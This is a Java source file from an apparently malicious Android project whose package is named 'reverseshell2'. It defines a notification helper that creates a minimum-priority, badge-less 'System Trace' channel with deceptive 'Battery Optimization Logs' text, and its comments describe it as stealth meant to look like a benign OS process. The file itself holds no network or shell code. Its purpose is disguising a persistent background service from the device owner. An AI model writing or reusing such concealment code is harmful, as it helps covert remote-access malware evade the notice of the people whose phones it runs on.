package com.example.reverseshell2;
 
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import androidx.core.app.NotificationCompat;
 
 /**
  * Handles the creation of stealthy "System Trace" notification channels.
  * Designed to look like a benign OS background process.
  */
 public class NotificationHelper {
     public static final String CHANNEL_ID = "system_trace_channel";
     public static final String CHANNEL_NAME = "System Trace";
     public static final int NOTIFICATION_ID = 101;
 
     public static void createNotificationChannel(Context context) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
                     CHANNEL_NAME,
                     NotificationManager.IMPORTANCE_MIN // STATUS BAR STEALTH
             );
             channel.setDescription("Relays system battery optimization logs to the background manager.");
             channel.setShowBadge(false);
             
             NotificationManager manager = context.getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
             }
         }
     }
 
     public static Notification getSystemTraceNotification(Context context) {
         Intent intent = new Intent(context, MainActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(
                 context, 0, intent,
                 PendingIntent.FLAG_IMMUTABLE
         );
 
         return new NotificationCompat.Builder(context, CHANNEL_ID)
                 .setContentTitle("Battery Optimization Logs")
                 .setContentText("Synchronizing system state...")
                 .setSmallIcon(android.R.drawable.stat_notify_sync)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setCategory(NotificationCompat.CATEGORY_SERVICE)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .build();
     }
 }
